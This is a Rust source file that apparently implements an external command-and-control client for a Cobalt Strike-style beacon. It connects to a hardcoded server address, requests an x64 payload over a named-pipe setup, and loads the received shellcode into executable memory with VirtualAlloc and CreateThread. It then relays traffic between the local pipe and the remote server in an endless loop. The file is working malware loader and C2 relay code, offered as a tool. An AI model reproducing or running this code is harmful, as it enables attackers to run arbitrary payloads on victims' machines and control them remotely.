use named_pipe::PipeClient;
use std::io::{prelude::*, Error};
use std::net::TcpStream;
use std::{thread, time};

const DEBUG: bool = true;
const CONSOLE_ADDR: &str = "192.168.0.107:2222";
const PIPE_NAME: &str = "RustTest";

fn spawn_beacon(payload: Vec<u8>) {
    use std::ptr::{copy_nonoverlapping, null_mut};
    use windows::Win32::System::{Memory::*, Threading::*};

    unsafe {
        let alloc = VirtualAlloc(null_mut(), 1024 * 1024, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        let ptr: *const u8 = payload.as_ptr();
        copy_nonoverlapping(ptr, alloc as *mut u8, payload.len());
        CreateThread(
            null_mut(),
            0,
            Some(std::mem::transmute(alloc as *const _ as *const ())),
            null_mut(),
            THREAD_CREATION_FLAGS(0),
            null_mut(),
        )
        .unwrap();
    }
}

#[derive(Debug)]
struct SocketChannel {
    socket: TcpStream,
}

impl SocketChannel {
    fn recv_data(&mut self) -> Result<Vec<u8>, ()> {
        let mut data = Vec::new();
        let mut _len = [0; 4];
        let mut buffer = [0; 0x100];
        if 4 != self.socket.read(&mut _len).unwrap() {
            panic!("recv_data() Error")
        }
        let mut buffersize = 0;
        let len = u32::from_le_bytes(_len) as usize;
        while buffersize < len {
            let slice_len = self.socket.read(&mut buffer).unwrap();
            buffersize += slice_len;
            data.append(&mut buffer[0..slice_len].to_vec());
        }
        return Ok(data);
    }

    fn send_data(&mut self, payload: &mut Vec<u8>) -> std::io::Result<()> {
        let payloadlen = payload.len() as u32;
        let mut buffer = payloadlen.to_le_bytes().to_vec();
        buffer.append(payload);
        self.socket.write(&buffer)?;
        Ok(())
    }
}

#[derive(Debug)]
struct PipeChannel {
    pipe: PipeClient,
    debug: bool,
}

impl PipeChannel {
    fn write_pipe(&mut self, buffer: &mut Vec<u8>) -> Result<(), Error> {
        if self.debug && buffer.len() > 4 && buffer.len() < 1024 {
            println!("[+] Sending pipe data: {:?}", buffer);
        }
        let bytes = (buffer.len() as u32).to_le_bytes();
        self.pipe.write_all(&bytes)?;
        self.pipe.write_all(buffer)?;
        Ok(())
    }

    fn read_pipe(&mut self) -> Result<Vec<u8>, Error> {
        let mut frame_size = [0; 4];
        if 4 != self.pipe.read(&mut frame_size)? {
            panic!("read_pipe() Error")
        }
        let size = u32::from_le_bytes(frame_size) as usize;
        let mut buffer = Vec::with_capacity(size);
        buffer.resize(size, 0);
        self.pipe.read_exact(&mut buffer)?;
        if self.debug && buffer.len() > 4 && buffer.len() < 1024 {
            println!("[+] Read pipe data: {:?}", &buffer);
        }
        Ok(buffer)
    }
}

fn main() {
    //与服务端建立TCP连接
    let mut socket = SocketChannel {
        socket: TcpStream::connect(CONSOLE_ADDR).unwrap(),
    };
    //接收服务端传来的载荷
    socket
        .send_data(&mut "arch=x64".as_bytes().to_vec())
        .unwrap();
    socket
        .send_data(&mut format!(r#"pipename={}"#, PIPE_NAME).as_bytes().to_vec())
        .unwrap();
    socket
        .send_data(&mut "block=500".as_bytes().to_vec())
        .unwrap();
    socket.send_data(&mut "go".as_bytes().to_vec()).unwrap();

    let mut payload = socket.recv_data().unwrap();

    spawn_beacon(payload);

    println!("Create Thread Done");
    let one_second = time::Duration::from_millis(1000);
    let ten_millis = time::Duration::from_millis(10);
    thread::sleep(one_second);

    let mut pipe = PipeChannel {
        pipe: PipeClient::connect(format!(r#"\\.\pipe\{}"#, PIPE_NAME)).unwrap(),
        debug: DEBUG,
    };

    println!("Connect Pipe Done");

    //读写pipe
    loop {
        thread::sleep(ten_millis);
        let mut from_pipe = pipe.read_pipe().unwrap();
        socket.send_data(&mut from_pipe).unwrap();
        payload = socket.recv_data().unwrap();
        pipe.write_pipe(&mut payload).unwrap();
    }
}
